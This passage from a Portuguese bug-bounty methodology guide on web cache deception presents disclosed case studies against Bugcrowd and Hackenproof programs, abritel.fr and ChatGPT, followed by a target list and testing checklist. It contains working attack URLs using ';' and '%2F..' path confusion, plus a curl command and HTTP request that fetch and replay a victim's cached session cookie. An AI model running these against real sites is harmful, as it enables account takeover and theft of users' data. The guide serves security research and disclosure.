  relacionada na mesma funcionalidade**. Vale sempre repassar o comportamento
  de funcionalidades semelhantes depois que uma correção é aplicada, pois a
  superfície ao redor pode estar mal implementada.
- O token aparecia no HTML apenas em algumas requisições não autenticadas, não
  em todas. A inconsistência gerou dúvida se era comportamento real ou falso
  positivo. O pesquisador pediu a um amigo para testar (**outro IP**) para ter
  certeza de que não estava enganado. **Sempre investigue a fundo antes de
  descartar.**


### 12.2 Bugcrowd — `window.current_user` numa página 404 cacheada (P3)

Subdomínio de um BBP público, com tipo de registro de usuário diferente.

1. Criar uma conta.
2. Notar que `https://subdominio.alvo.com/gb/account/` tem um objeto
   `window.current_user` com dado sensível: `user_id`, e-mail, telefone.
3. O header vinha `CF-Cache-Status: DYNAMIC` — o Cloudflare **não** considerava
   a URL elegível para cache.
4. Anexar `/test.css` → `https://subdominio.alvo.com/gb/account/test.css`.
   A página responde **"Página não encontrada"**, mas o `CF-Cache-Status`
   mudou de `DYNAMIC` para **`MISS`**.
5. **Não presumir que não há bug.** Ao analisar o código-fonte da página de
   erro, o objeto `window.current_user` **continuava lá**, com todas as
   informações do usuário.
6. Abrir a mesma URL em outro navegador e confirmar que o dado persiste.

Severidade: **P3**. Lição: a mensagem de erro enganou; o corpo não.

### 12.3 Hackenproof — confusão de caminho com `;` (Média, 6.9)

Site Web3 de BBP público.

1. Criar uma conta.
2. O endpoint `https://www.alvo.com/-/x/us/us/open/user/get` é uma API que
   devolve todas as informações do usuário, com `CF-Cache-Status: DYNAMIC`.
3. Tentar `.../user/get/test.css` → o status muda para `MISS`, **mas** a
   resposta é um 404 que não expõe dado nenhum. Técnica (a) falhou.
4. Tentar `.../user/get;test.css` → a resposta traz **todas as informações do
   usuário** e `CF-Cache-Status: MISS`. Reenviando a mesma URL, vira **`HIT`**
   — a resposta passou a vir do servidor de cache, não da origem.

> O que aconteceu é **confusão de caminho**: o servidor trata o `;` como início
> de parâmetro, do mesmo modo que trataria um `?`. Então a origem responde a
> rota `/get` e ignora o `;test.css`. O servidor de cache, por sua vez, lê
> `/get;test.css` como um arquivo CSS estático e guarda o conteúdo.

5. Confirmar em outro navegador.
6. O mesmo bug afetava também `https://global.alvo.com`.

Severidade: **Média (6.9)**. Lição: quando a extensão como segmento novo cai em
404, o `;` é a próxima tentativa — não o fim da linha.

### 12.4 Web3 privado — travessia codificada furando a exceção de cache (P3)

O alvo cacheava **todas** as requisições, **exceto** as de `/_api/*`.

1. Criar uma conta.
2. Todas as respostas vinham `CF-Cache-Status: HIT`, mas qualquer endpoint com
   dado do usuário — `/_api/ucenter/user-info` — vinha `DYNAMIC`.
3. Requisitar `/qualquer-endpoint-cacheado%2F../_api/ucenter/user-info` →
   retornou o conteúdo de `/_api/ucenter/user-info` com `MISS`; ao reenviar,
   virou **`HIT`**.

> O servidor decodificou o `%2F`, resolveu a travessia e devolveu o conteúdo de
> `/_api/ucenter/user-info`. O cache, porém, tratou a URL como se o recurso
> estivesse dentro de `/qualquer-endpoint-cacheado/` — prefixo que ele já
> considerava cacheável — e armazenou.

4. Confirmar em outro navegador.

Severidade: **P3**. Lição: uma regra do tipo "cacheia tudo menos `/_api/*`" é
justamente o que a travessia codificada contorna — a exceção vira o alvo.

### 12.5 Expedia / abritel.fr — sessão em texto claro via `.jpeg` (Account Takeover)

Reportado por *bombon* ao Expedia Group Bug Bounty em 12/09/2022.
**Título:** *I was able to Takeover Accounts via Cache Deception*

Três fatores combinados:

1. O **token de sessão** (`HASESSIONV3`) era refletido em
   `https://www.abritel.fr/search/keywords:soissons-france-(xss)/minNightlyPrice/{qualquer}`
   e o servidor respondia **200 OK** — e respostas 200 permitem que o cache
   dure **muito mais** que qualquer outra resposta.
2. O servidor de cache tratava
   `.../minNightlyPrice/cached.jpeg` como resposta **cacheável**, por causa da
   extensão `.jpeg` no fim da URL, e salvava.
3. Com a sessão em mãos, era possível acessar `/traveler/profile/edit` e obter
   o token `ha.crumb`.

**Passos — vítima:**

```
Visitar https://www.abritel.fr/search/keywords:soissons-france-(xss)/minNightlyPrice/x.jpeg?triagethis
```

**Passos — atacante:**

```bash
curl 'https://www.abritel.fr/search/keywords:soissons-france-(xss)/minNightlyPrice/x.jpeg?triagethis' \
  --compressed | grep -i 'HASESSIONV3'
```

E então usar o token direto no header, sem precisar de XSS:

```http
GET /traveler/profile/edit HTTP/2
Host: www.abritel.fr
Cookie: HASESSIONV3=<token obtido>
```

procurando a variável `ha.crumb` na resposta.

**Impacto:** Account Takeover.
**Correção do time:** removeram o token de sessão de **todas** as páginas — que
é a recomendação a fazer para qualquer programa nessa situação.
**Remediação sugerida no report:** adicionar regras de cache para todas as
extensões cacheáveis.

Lição: a extensão entrou **no lugar do valor de um parâmetro de path**
(`minNightlyPrice/x.jpeg`), não como segmento extra — é a técnica (d) da
seção 4.2. E o `200 OK` preservado é o que deu TTL longo ao vazamento.

### 12.6 ChatGPT / OpenAI — wildcard cache deception, US$ 6.500

O caso que originou a técnica 4.4. Vale notar que já **havia** uma correção
anterior: o Nagli tinha reportado uma web cache deception no ChatGPT, a OpenAI
notificou os usuários e corrigiu. Esta é uma segunda passada na **mesma
funcionalidade** — reforçando a lição da 12.1: reteste a superfície ao redor
depois de uma correção.

**Descoberta inicial — um bug de UI que era cache**

Brincando com a feature de "share" (compartilhar chats publicamente), os links
compartilhados **não atualizavam** conforme a conversa seguia. O primeiro
palpite foi cache — confirmado ao abrir o Network e ver `Cf-Cache-Status: HIT`.

Isso chamou atenção porque **não era arquivo estático**, e o path não tinha
extensão nenhuma:

```
https://chat.openai.com/share/CHAT-UUID
```

Ou seja, a regra de cache não dependia de extensão, e sim da **localização no
path**. Para testar, foi requisitado
`https://chat.openai.com/share/caminho-aleatorio-que-nao-existe` — **também
cacheado**. A regra era, na prática:

```
/share/*      ->  cacheia qualquer coisa aqui embaixo
```

**A confusão de parser**

Num site com cache, o request passa pelo CDN antes de chegar ao servidor — a URL
é parseada **duas vezes**. No ChatGPT, o CDN da Cloudflare **não decodificava
nem normalizava** uma travessia URL-encoded, mas o servidor web **sim**.

```
https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123
```

- O CDN cacheia qualquer coisa sob `/share/`
- O CDN **não** decodifica nem normaliza `%2F..%2F` → a resposta **será** cacheada
- Ao encaminhar, o servidor web **decodifica e normaliza** → responde
  `/api/auth/session`, que contém o **auth token**

**O ataque:** quando a vítima acessa
`https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123`, o
token dela é cacheado. Quando o atacante depois visita a **mesma URL**, vê o
token cacheado da vítima. Game over — com o token vem takeover da conta,
leitura dos chats, informações de cobrança e mais.

**Resumo em uma frase:** uma travessia URL-encoded permitiu cachear endpoints
de API sensíveis, graças a uma inconsistência de normalização de path entre CDN
e servidor web.

**Bounty: US$ 6.500** — e, segundo o pesquisador, um dos achados mais rápidos
que já teve.

**Lições transferíveis:**

- **Um bug de UI pode ser um bug de cache.** "A página não atualiza" é sintoma
  clássico — vá direto olhar os headers.
- **Cache `HIT` em path sem extensão** significa regra por localização. Teste
  imediatamente um caminho inexistente sob o prefixo para confirmar o wildcard.
- **Regra de cache relaxada + confusão de parser de URL** é a combinação que
  abre porta para todo tipo de bug de cache. Ao achar uma, procure a outra.
- **Corrigido não é imune.** Esta foi a segunda cache deception no mesmo alvo,
  na mesma feature, depois de uma correção pública.

## 13. Onde mais essa classe aparece

Aplique o mesmo método a qualquer resposta cacheável que carregue dado de
usuário:

- Perfis públicos com integrações OAuth vinculadas
- Páginas de "conta" / "configurações" com `Cache-Control: public`
- Respostas de API `GET` cacheadas na borda (`/api/me`, `/api/user/:id`)
- Páginas de checkout, pedido, fatura (PII, endereço, últimos dígitos de cartão)
- Convites, links compartilháveis, páginas de "preview"
- Endpoints de SSR que hidratam com o objeto de sessão inteiro
- Páginas de erro que ecoam dado da sessão

## 14. Checklist

- [ ] Cache buster ALEATÓRIO em toda requisição, com e sem extensão (seção 1.2).
- [ ] Mesmo buster dentro de um ciclo; buster NOVO ao trocar técnica/extensão/estado/página.
- [ ] Nunca testado direto na URL de produção sem buster.
- [ ] Duas contas próprias em uso (vítima e atacante) — nenhum usuário real alvejado.
- [ ] Segredo confirmado no HTML da resposta **autenticada** primeiro.
- [ ] Headers de cache mapeados (`Age`, `X-Cache`, `Cache-Control`, `Vary`).
- [ ] `Vary: Cookie` verificado — ausente é a hipótese confirmada.
- [ ] URL virgem usada, ou TTL respeitado (regra de ordem de priming, seção 6).
- [ ] Vítima visitou autenticada **antes** de qualquer requisição anônima.
- [ ] Pelo menos 30 tentativas anônimas antes de qualquer conclusão negativa.
- [ ] Testado de ao menos duas redes/IPs diferentes.
- [ ] Nó de cache que serviu o token registrado (`X-Served-By` / `CF-Ray`).
- [ ] Ciclo completo reproduzido no mínimo duas vezes.
- [ ] Escopos do token verificados por introspecção, com acesso mínimo.
- [ ] Endpoint sensível que responde DYNAMIC: trilha de deception rodada (8.1).
- [ ] As quatro técnicas testadas: extensão-segmento, `;`, `%2F../`, extensão-no-valor.
- [ ] As quatro falharam? Procurado prefixo com regra WILDCARD (path inexistente vindo `HIT`).
- [ ] Achado o wildcard: traversal codificado `%2F..%2F` até o endpoint sensível (4.4).
- [ ] `curl --path-as-is` usado em toda travessia — senão o cliente normaliza.
- [ ] Endpoints de API mirados também, não só HTML (`/api/auth/session`, `/api/me`).
- [ ] Extensões testadas: **apenas** `.js`, `.css`, `.jpg` (12 variantes por endpoint).
- [ ] Endpoint SEM header de cache não foi descartado — prova comportamental feita mesmo assim.
- [ ] Corpo lido em TODA resposta, inclusive 404/403/500 — nunca só pelo status.
- [ ] Transição `DYNAMIC -> MISS -> HIT` documentada (reenvio para chegar em HIT).
- [ ] Procurado cookie/ID de sessão em texto claro, não só token OAuth.
- [ ] Cache Poisoning também testado no mesmo endpoint (`cache-poisoning-xss`).
- [ ] Report explica a inconsistência, dá o loop pronto e descreve a amplificação.
- [ ] Token redigido no report.
